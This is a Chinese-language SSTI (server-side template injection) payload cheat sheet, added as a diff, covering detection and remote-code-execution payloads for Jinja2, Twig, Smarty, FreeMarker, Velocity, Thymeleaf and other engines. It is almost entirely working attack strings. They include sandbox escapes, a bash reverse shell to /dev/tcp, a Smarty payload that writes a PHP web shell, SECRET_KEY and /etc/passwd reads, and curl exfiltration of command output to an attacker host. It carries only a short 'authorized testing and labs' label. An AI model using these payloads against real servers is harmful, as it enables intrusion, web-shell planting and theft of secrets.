@@ -1,0 +1,99 @@
+==========================================================================
+ SSTI 服务端模板注入 Payload 速查（含识别与 RCE）
+ 仅用于授权测试与靶场
+==========================================================================
+
+【0x01 探测：先确定引擎】
+ 依次发（数学运算看回显）:
+    {{7*7}}        -> 49: Jinja2/Twig/Velocity/Freemarker 等
+    ${7*7}         -> 49: FreeMarker/EL/JSP EL
+    <%=7*7%>       -> ERB(Ruby)
+    #{7*7}         -> Ruby/Smarty
+    {{7*'7'}}      -> 7777777: Jinja2(Python)；49: Twig(PHP)
+    *{7*7}         -> Thymeleaf
+ 语法对照:
+    {{}}  Jinja2(Flask/Django 部分)/Twig/Swig
+    ${}   FreeMarker / Velocity / Spring EL / Java EL
+    #{}   Smarty / Ruby
+    @( )  Razor(.NET)
+
+【0x02 Jinja2 / Flask（Python，CTF 最高频）】
+ 探测: {{config}}  {{config.items()}}  {{request}}
+ 读配置/SECRET_KEY:
+    {{config['SECRET_KEY']}}
+    {{get_flashed_messages.__globals__['current_app'].config['SECRET_KEY']}}
+ 任意文件读:
+    {{ ''.__class__.__mro__[1].__subclasses__() }}   # 列子类找 os._wrap_close/Popen
+ 通用 RCE（找 Popen）:
+    {% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='Popen' %}{{c(['id'],shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}
+ 通用 RCE（找 os._wrap_close 拿 os）:
+    {{cycler.__init__.__globals__.os.popen('id').read()}}
+    {{joiner.__init__.__globals__.os.popen('id').read()}}
+    {{namespace.__init__.__globals__.os.popen('id').read()}}
+    {{lipsum.__globals__['os'].popen('id').read()}}
+ 无关键字绕过(attr/过滤器):
+    {{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
+    request 对象:
+    {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("id").read()')}}
+ 字符串拼接/ chr 绕过:
+    {%set a='__cla'+'ss__'%}{{(''|attr(a))}}
+ 过滤器绕数字/引号:
+    {{self|string|list}} 取字符；|attr 链式调用
+ 常用一键 payload（无回显时反弹）:
+    {{lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/x/x 0>&1"').read()}}
+
+【0x03 Twig (PHP / Symfony)】
+ 探测: {{7*'7'}} = 49
+ RCE:
+    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+    {{['id']|filter('system')}}
+    {{_self.env.setCache("ftp://attacker:2121")}}{{_self.env.loadTemplate("x")}}
+ 读文件: {{'/etc/passwd'|file_excerpt(1,30)}}
+
+【0x04 Smarty (PHP)】
+ RCE:
+    {php}echo `id`;{/php}                              (Smarty 3 老版本)
+    {system('id')}
+    {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
+ 读配置: {config_load file="../config/database.yml"}
+
+【0x05 FreeMarker (Java)】
+ 探测: ${7*7}
+ RCE:
+    <#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}
+    <#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
+    ${ob("java.lang.ProcessBuilder",["id"]).start()}
+ 读文件: ${object?api.class.protectionDomain.codeSource}
+
+【0x06 Velocity (Java)】
+ #set($e="exp")  $e.getClass().forName("java.lang.Runtime")...
+ RCE:
+    #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
+    #set($chr=$x.class.forName('java.lang.Character'))
+    #set($str=$x.class.forName('java.lang.String'))
+    #set($ex=$rt.getRuntime().exec('id'))
+    $ex.waitFor() #set($out=$ex.getInputStream())
+    #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+【0x07 Thymeleaf (Spring)】
+ URL 路径表达式:
+    /__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+    /~{T(java.lang.Runtime).getRuntime().exec("id")}/
+ SpEL:
+    ${T(java.lang.Runtime).getRuntime().exec('id')}
+    #{T(java.lang.Runtime).getRuntime().exec('id')}
+
+【0x08 其他】
+ ERB(Ruby): <%=`id`%>   <%= system('id') %>
+ Razor(.NET): @(System.Diagnostics.Process.Start("cmd","/c whoami"))
+ Handlebars: 无直接 RCE，原型链污染/已知 CVE 另查
+ Pug/Jade(Node): #{global.process.mainModule.require('child_process').execSync('id')}
+ Dust: {#if}{/if} 配合辅助函数，视应用而定
+
+【0x09 利用思路】
+ 1) 数学运算确定模板族 -> 2) 报错/调试信息确认引擎版本
+ -> 3) 找沙箱逃逸 gadget（Python 走 __subclasses__，Java 走 forName/Runtime）
+ -> 4) 先执行 id/whoami 验证 -> 5) 反弹 shell 或读 flag
+ 无回显: 外带 DNS/HTTP:  curl http://attacker/`whoami|base64`
+ 工具: SSTImap:  python3 sstimap.py -u 'http://t/?q=*' --os-shell
+==========================================================================
